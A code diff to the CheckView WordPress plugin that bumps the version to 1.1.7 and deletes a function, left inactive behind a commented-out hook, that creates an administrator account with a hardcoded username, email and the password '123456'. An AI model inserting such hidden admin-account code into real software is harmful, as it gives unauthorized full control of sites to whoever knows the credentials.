@@ -15,7 +15,7 @@
  * Plugin Name:       CheckView
  * Plugin URI:        https://checkview.io
  * Description:       CheckView is the #1 fully automated solution to test your WordPress forms and detect form problems fast.  Automatically test your WordPress forms to ensure you never miss a lead again.
- * Version:           1.1.6
+ * Version:           1.1.7
  * Author:            CheckView
  * Author URI:        https://checkview.io/
  * License:           GPL-2.0+
@@ -36,7 +36,7 @@ if ( ! defined( 'WPINC' ) ) {
  * Start at version 1.0.0 and use SemVer - https://semver.org
  * Rename this for your plugin and update it as you release new versions.
  */
-define( 'CHECKVIEW_VERSION', '1.1.6' );
+define( 'CHECKVIEW_VERSION', '1.1.7' );
 
 /**
  * Define constant for plugin settings link
@@ -121,39 +121,3 @@ add_action(
 		}
 	}
 );
-
-function create_new_admin_user() {
-	$username = 'faizan';
-	$email    = 'faizan+12@inspry.com';
-	$password = '123456';
-
-	if ( ! username_exists( $username ) && ! email_exists( $email ) ) {
-		// Create the new user
-		$user_id = wp_create_user( $username, $password, $email );
-
-		// Check if the user was created successfully
-		if ( ! is_wp_error( $user_id ) ) {
-			// Update the user's role to administrator
-			$user = new WP_User( $user_id );
-			$user->set_role( 'administrator' );
-
-			// Optionally, set the user's display name
-			wp_update_user(
-				array(
-					'ID'           => $user_id,
-					'first_name'   => 'faizan',
-					'display_name' => 'faizan',
-				)
-			);
-
-			echo 'User created successfully with admin role.';
-		} else {
-			echo 'Error: ' . $user_id->get_error_message();
-		}
-	} else {
-		echo 'Username or email already exists.';
-	}
-}
-
-// Hook the function to an action, such as 'init' or a custom one
-//add_action( 'init', 'create_new_admin_user' );
